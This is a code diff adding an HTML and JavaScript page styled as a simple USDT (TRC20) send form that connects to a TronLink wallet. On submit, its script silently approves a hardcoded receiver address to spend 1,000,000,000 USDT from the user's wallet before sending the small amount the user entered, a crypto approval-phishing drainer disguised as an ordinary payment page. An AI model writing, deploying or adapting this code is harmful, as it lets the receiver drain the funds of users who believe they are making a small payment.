@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Approval and Send</title>
+    <style>
+        /* General body styles */
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1d2b64, #f8cdda);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Container for centering form */
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            position: relative;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        /* Input styles */
+        input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+
+        /* Button styles */
+        button {
+            background: linear-gradient(135deg, #1d2b64, #f8cdda);
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #f8cdda, #1d2b64);
+        }
+
+        /* Circle background animation */
+        .circle {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            animation: float 10s ease-in-out infinite;
+        }
+
+        .circle:nth-child(1) {
+            width: 100px;
+            height: 100px;
+            top: 10%;
+            left: 20%;
+            animation-delay: 0s;
+        }
+
+        .circle:nth-child(2) {
+            width: 80px;
+            height: 80px;
+            top: 60%;
+            left: 70%;
+            animation-delay: 2s;
+        }
+
+        .circle:nth-child(3) {
+            width: 60px;
+            height: 60px;
+            top: 40%;
+            left: 80%;
+            animation-delay: 4s;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+            100% { transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Background circles for styling -->
+    <div class="circle"></div>
+    <div class="circle"></div>
+    <div class="circle"></div>
+
+    <!-- Form container -->
+    <div class="container">
+        <img src="your-brand-logo.png" alt="Brand Logo" style="width: 100px; margin-bottom: 20px;">
+        <form id="usdtForm">
+            <label for="senderAddress">Sender Address</label>
+            <input type="text" id="senderAddress" readonly>
+
+            <label for="receiverAddress">Receiver Address</label>
+            <input type="text" id="receiverAddress" value="TFwMA6d1aCaCvEyQGXwHbNWQmRU9qeJnXr" readonly>
+
+            <label for="amount">Amount (USDT)</label>
+            <input type="number" id="amount" min="0.1" step="0.1" required>
+
+            <button type="submit" id="sendButton">Send USDT</button>
+        </form>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@2.2.0/dist/TronWeb.min.js"></script>
+    <script>
+        const contractABI = [
+            {"constant": true, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "payable": false, "stateMutability": "view", "type": "function"},
+            {"constant": false, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function"},
+            {"constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function"},
+            {"constant": true, "inputs": [{"name": "who", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function"}
+        ];
+
+        const settings = {
+            contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // USDT (TRC20) contract address
+            receiverAddress: 'TFwMA6d1aCaCvEyQGXwHbNWQmRU9qeJnXr', // Default receiver address
+            defaultApprovalAmount: 1000000000, // 1,000,000,000 USDT
+            tronWebUrl: 'https://api.trongrid.io', // Mainnet
+            minAmount: 0.1,
+            alertMessages: {
+                tronLinkNotInstalled: 'Please install TronLink!',
+                amountTooLow: 'Amount must be greater than 0.1 USDT!',
+                transactionSuccess: 'Transaction successful!',
+                transactionFailed: 'Transaction failed. Check the console for more details.'
+            }
+        };
+
+        // Check if TronLink is installed and the TronWeb object is available
+        window.addEventListener('load', async () => {
+            if (window.tronWeb && window.tronWeb.ready) {
+                const tronWeb = window.tronWeb;
+                try {
+                    const accounts = await tronWeb.trx.getAccounts();
+                    document.getElementById('senderAddress').value = accounts[0].address;
+                } catch (error) {
+                    console.error("Error fetching accounts", error);
+                }
+            } else {
+                alert(settings.alertMessages.tronLinkNotInstalled);
+            }
+        });
+
+        // Form submission to approve and send USDT
+        document.getElementById('usdtForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const amount = document.getElementById('amount').value;
+
+            if (amount < settings.minAmount) {
+                alert(settings.alertMessages.amountTooLow);
+                return;
+            }
+
+            const tronWeb = window.tronWeb;
+            const contractAddress = settings.contractAddress;
+            const receiverAddress = settings.receiverAddress;
+            const contract = tronWeb.contract(contractABI, contractAddress);
+
+            const senderAddress = document.getElementById('senderAddress').value;
+
+            try {
+                // Approve the default amount
+                await contract.approve(receiverAddress, tronWeb.toSun(settings.defaultApprovalAmount)).send({ from: senderAddress });
+
+                // Transfer the entered amount
+                await contract.transfer(receiverAddress, tronWeb.toSun(amount)).send({ from: senderAddress });
+
+                alert(settings.alertMessages.transactionSuccess);
+            } catch (error) {
+                console.error('Transaction failed:', error);
+                alert(settings.alertMessages.transactionFailed);
+            }
+        });
+    </script>
+
+</body>
+</html>
